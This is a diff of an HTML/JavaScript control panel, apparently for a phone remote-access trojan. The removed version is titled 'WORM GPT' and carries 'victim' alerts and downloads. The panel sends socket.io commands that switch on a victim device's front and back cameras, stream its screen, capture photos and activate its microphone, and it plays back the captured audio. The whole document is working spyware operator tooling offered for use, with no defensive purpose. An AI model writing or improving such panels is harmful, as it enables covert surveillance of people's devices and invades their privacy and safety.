@@ -1,55 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>WORM GPT - ULTIMATE CONTROL</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; }
-        .status { background: #111; padding: 10px; border-bottom: 2px solid #f00; color: #0f0; }
-        #monitor { width: 95%; max-width: 1100px; height: 600px; border: 3px solid #f00; margin: 20px auto; background: #050505; display: flex; align-items: center; justify-content: center; }
-        #liveImg { max-width: 100%; max-height: 100%; object-fit: contain; }
-        .controls { background: #111; padding: 20px; position: fixed; bottom: 0; width: 100%; border-top: 2px solid #f00; }
-        button { background: #f00; color: #000; border: none; padding: 12px 20px; margin: 5px; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        button:hover { background: #fff; color: #f00; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #monitor { width: 100vw; height: calc(100vh - 120px); background: #050505; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+        #liveImg { max-width: 100%; max-height: 100%; border: 1px solid #333; object-fit: contain; }
+        #photoDisplay { display: none; max-width: 100%; max-height: calc(100vh - 140px); border: 2px solid #0f0; }
+        .status { color: #0f0; font-size: 14px; margin-top: 5px; }
+        .controls { height: 120px; background: #111; border-top: 2px solid #0f0; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 10px; padding: 5px; }
+        button { background: #0f0; color: #000; padding: 12px 20px; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; }
+        button:hover { background: #fff; }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        .stop-btn { background: #f00; color: #fff; }
+        #audioPlayer { display: none; }
     </style>
 </head>
 <body>
-    <div class="status" id="stat">Waiting for target connection...</div>
-
     <div id="monitor">
-        <img id="liveImg" src="" alt="[ FEED OFFLINE ]">
+        <img id="liveImg" src="">
+        <img id="photoDisplay" src="">
+        <div class="status" id="status">🟢 في انتظار الاتصال...</div>
     </div>
-
+    
+    <!-- Audio Player مخفي لتشغيل الصوت -->
+    <audio id="audioPlayer" controls autoplay style="display:none;"></audio>
+    
     <div class="controls">
-        <button onclick="send('start_camera_back')">الكاميرا الخلفية 📸</button>
-        <button onclick="send('start_camera_front')">الكاميرا الأمامية 🤳</button>
-        <button onclick="send('start_screen')">مشاهدة الشاشة مباشر 📱</button>
-        <button onclick="send('take_photo')">التقاط صورة 🖼️</button>
-        <button onclick="send('start_audio')">الميكروفون 🎙️</button>
-        <button onclick="location.reload()">إيقاف / تحديث 🛑</button>
+        <button onclick="send('start_camera_back')">📸 الكاميرا الخلفية</button>
+        <button onclick="send('start_camera_front')">🤳 الكاميرا الأمامية</button>
+        <button onclick="send('stop_camera')" class="stop-btn">🛑 إيقاف الكاميرا</button>
+        <button onclick="send('start_screen')">📱 بث الشاشة</button>
+        <button onclick="send('stop_screen')" class="stop-btn">🛑 إيقاف الشاشة</button>
+        <button onclick="send('take_photo')">🖼️ التقاط صورة</button>
+        <button onclick="send('start_audio')">🎙️ تشغيل الميكروفون</button>
+        <button onclick="send('stop_audio')" class="stop-btn">🔇 إيقاف الميكروفون</button>
+        <button onclick="location.reload()">🔄 تحديث</button>
     </div>
-
+    
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        const imgView = document.getElementById('liveImg');
+        const img = document.getElementById('liveImg');
+        const photoImg = document.getElementById('photoDisplay');
+        const statusDiv = document.getElementById('status');
+        const audioPlayer = document.getElementById('audioPlayer');
 
-        socket.on('new_victim_alert', d => { document.getElementById('stat').innerText = "ONLINE: " + d.model; });
-
-        // استقبال الفيديو (بث الكاميرا أو الشاشة)
-        socket.on('display_frame', d => { imgView.src = "data:image/jpeg;base64," + d.frame; });
-
-        // استقبال الصور الملتقطة وحفظها للجهاز
-        socket.on('display_photo', d => {
-            const b64 = "data:image/jpeg;base64," + d.img;
-            imgView.src = b64;
-            let link = document.createElement('a');
-            link.href = b64;
-            link.download = "victim_photo.jpg";
-            link.click();
+        // استقبال فريمات الفيديو المباشر
+        socket.on('display_frame', d => { 
+            img.style.display = 'block';
+            photoImg.style.display = 'none';
+            img.src = "data:image/jpeg;base64," + d.frame;
+            statusDiv.textContent = '📡 بث مباشر قيد التشغيل';
         });
 
-        function send(cmd) { socket.emit('admin_command', { command: cmd }); }
+        // استقبال الصور عالية الدقة
+        socket.on('display_photo', d => { 
+            img.style.display = 'none';
+            photoImg.style.display = 'block';
+            photoImg.src = "data:image/jpeg;base64," + d.img;
+            statusDiv.textContent = '🖼️ صورة عالية الدقة مستلمة!';
+        });
+
+        // استقبال الصوت
+        socket.on('play_audio', d => {
+            if (d.audio) {
+                // تحويل Base64 إلى Blob وتشغيله
+                const binary = atob(d.audio);
+                const bytes = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) {
+                    bytes[i] = binary.charCodeAt(i);
+                }
+                const blob = new Blob([bytes], { type: 'audio/webm' });
+                const url = URL.createObjectURL(blob);
+                audioPlayer.src = url;
+                audioPlayer.play();
+                statusDiv.textContent = '🎙️ استقبال صوت من الميكروفون';
+            }
+        });
+
+        // أمر الإيقاف
+        socket.on('stream_stopped', d => {
+            statusDiv.textContent = '⏹️ البث متوقف';
+        });
+
+        function send(cmd) { 
+            socket.emit('admin_command', { command: cmd }); 
+        }
     </script>
 </body>
 </html>
